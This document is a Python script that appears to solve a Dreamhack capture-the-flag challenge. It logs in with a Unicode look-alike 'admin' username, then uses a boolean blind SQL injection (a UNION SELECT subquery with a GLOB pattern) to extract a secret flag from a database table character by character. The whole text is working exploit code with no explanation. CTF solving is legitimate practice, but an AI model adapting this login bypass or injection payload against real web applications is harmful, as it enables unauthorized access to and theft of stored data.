import requests
import string

url = "http://host8.dreamhack.games:8202/"
s = requests.Session()

res = s.post(f'{url}/login', data={
    'username': 'admın'
})

if "failed" not in res.text.lower():
    print("> Logged in")

charset = string.digits + string.ascii_letters + "!$&?@{}|~_"
flag = "B1N4RY{"

while not flag.endswith("}"):
    for char in charset:
        print("Trying:", char, '|', flag)

        payload = f"' union select * from (select * from ((select 1) join (select 2 a) join (select 3)) UNION SELECT * FROM secretgyul) where a glob '{flag}{char}*'--"

        res = s.post(f'{url}/search', headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={
            "name": payload
        })

        if res.json()["exists"]:
            flag += char
            break

print("Flag:", flag)